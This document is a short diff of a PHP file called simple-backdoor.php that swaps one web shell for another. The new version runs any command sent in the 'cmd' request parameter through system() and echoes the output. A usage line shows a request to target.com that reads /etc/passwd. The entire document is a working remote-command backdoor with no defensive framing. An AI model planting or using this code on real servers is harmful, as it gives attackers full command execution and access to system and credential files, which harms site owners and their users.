@@ -1,6 +1,13 @@
 <?php
-if(isset($_GET['cmd']))
-{
-    system($_GET['cmd'] . ' 2&<1');
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
 }
+
 ?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
